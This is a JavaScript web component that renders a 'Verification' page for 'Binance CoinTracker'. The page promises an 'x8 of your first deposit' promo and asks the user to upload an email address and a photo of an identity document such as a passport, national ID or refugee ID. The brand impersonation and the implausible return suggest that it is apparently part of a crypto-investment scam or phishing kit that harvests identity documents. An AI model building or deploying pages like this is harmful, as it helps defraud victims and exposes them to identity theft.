class Verification extends HTMLElement{
    connectedCallback() {
        this.innerHTML = `
            <!-- VERIFICATION STRUCTURE -->
            <div class="verification-page-display">
                <!-- -------------------- -------------------- NOTIFICATION PARENT CONTAINER -------------------- -------------------- -->
                    <div class="notification-parent">

                        <!-- -------------------- Header Container -------------------- -->
                            <div class="help-header-wrap wish-background">
                                <div class="container">
                                    <div class="help-header-container">
                                        <!-- Left container-->
                                        <div class="help-left-container">
                                            <div class="help-header-img btn-display" onclick="MenuToHome()">
                                                <img src="img/arrow-left.png" class="img-fluid">
                                            </div>
                                            <span class="help-header-txt">Verification</span>
                                        </div>
                                        <!-- Right container-->
                                        <div class="help-header-img"></div>
                                    </div>
                                </div>
                            </div>
                        <!-- -------------------- -------------------- -------------------- -->
                        <!-- -------------------- -------------------- -------------------- -->

                        <div class="container">                            
                            <div class="verification-lg-txt"></div>
                        </div>
                    </div>
                <!-- -------------------- -------------------- MENU PAGE PARENT CONTAINER -------------------- -------------------- -->
        
            </div>
            <!--  -------------------- -->
        `;
    }
}

customElements.define("verification-page", Verification);

function verificationPage() {
    // Verification page 
    var settingitself = document.getElementsByClassName("verification-lg-txt");
    for (let i = 0; i < settingitself.length; i++) {
        settingitself[i].innerHTML = `
            <!--  -->
            <div class="rulespolicy-txt">VERIFICATION PROCESS</div>
        
            <!--  -->
            <div class="userinfoslide-note-txt">Dear <span class="user-personal-name"></span>, in order to complete KYC (Know Your Customer) with Binance CoinTracker to start <span style="font-weight: 700;">"x8 of your first deposit"</span> promo. Follow the steps below:</div>
            <!--  -->
            <div class="userinfoslide-note-step">
                <div class="userinfoslide-note-step-icon">
                    <img src="img/bullet.png" class="img-fluid">
                </div>
                <div class="userinfoslide-note-txt userinfoslide-note-mar">Enter the you used to register with us Binance CoinTracker</div>
            </div>
            <!--  -->
            <div class="userinfoslide-note-step">
                <div class="userinfoslide-note-step-icon">
                    <img src="img/bullet.png" class="img-fluid">
                </div>
                <div class="userinfoslide-note-txt userinfoslide-note-mar">Send a photo of one of the listed documents. Driver’s License, National ID Card, Voter’s card, International passport, Certificate of Origin, Birth certificate or Refugee ID card.</div>
            </div>
            <!--  --> <!--  -->
            <div class="userinfoslide-note-txt userinfoslide-note-pad" ><span style="font-weight: 500;" >Important:</span> Please make sure to submit your correct email and also your above mentioned valid document otherwise, you will not be verified.</div>

            <!--  -->
            <div class="send-address-input-wrap">
                <input placeholder="Email..." onkeyup="getEmail(event)" type="email" name="img" id="fileUser" class="send-input" required>
                <div class="send-input-absolute">Hello <span class="user-personal-name"></span>, re-enter Email</div>
            </div>
            <div class="send-address-input-wrap">
                <input type="file" onchange="getFile(event)" name="img" accept"image/*" id="fileInp" class="inpFile cursor send-input" required>
                <div class="send-input-absolute">Choose Validation Image</div>
            </div>
            <div class="user-validation-btn" onclick="submidverifyid()">UPLOAD IMAGE</div>
        `;
    }
}